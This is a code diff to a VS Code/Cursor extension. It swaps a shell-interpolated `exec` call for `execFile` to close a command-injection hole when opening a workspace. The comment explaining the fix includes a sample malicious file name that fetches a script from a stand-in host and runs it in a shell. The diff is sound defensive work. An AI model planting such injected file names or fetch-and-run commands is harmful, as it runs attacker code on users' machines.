@@ -2,7 +2,7 @@ import * as vscode from "vscode";
 import * as fs from "fs";
 import * as path from "path";
 import * as os from "os";
-import { exec } from "child_process";
+import { execFile } from "child_process";
 import { parse as jsoncParse, modify, applyEdits, type ParseError } from "jsonc-parser";
 import { Run, ServiceRef, WorkspaceMode } from "../types";
 import { extractFileHints, resolveFilesInRepo, mention } from "./files";
@@ -368,7 +368,13 @@ export function writePlanFile(plan: PlanFile): void {
 export function openInEditor(target: string): Promise<boolean> {
   const app = vscode.env.appName || "Cursor";
   return new Promise((resolve) => {
-    exec(`open -a ${JSON.stringify(app)} ${JSON.stringify(target)}`, (err) => {
+    // `execFile`, never `exec`: both arguments are attacker-influenceable — the app
+    // name comes from the running editor, and `target` is a path built from a task
+    // key, a notepad title or a repo name. Through a shell, `JSON.stringify`'s double
+    // quotes still leave `$(…)`, backticks and `\` live, so a workspace file called
+    // `$(curl evil.sh|sh).code-workspace` would execute on Take. Passing an argv array
+    // spawns `open` with no shell at all, so there is nothing left to quote.
+    execFile("open", ["-a", app, target], (err) => {
       if (!err) return resolve(true);
       vscode.commands
         .executeCommand("vscode.openFolder", vscode.Uri.file(target), { forceNewWindow: true })
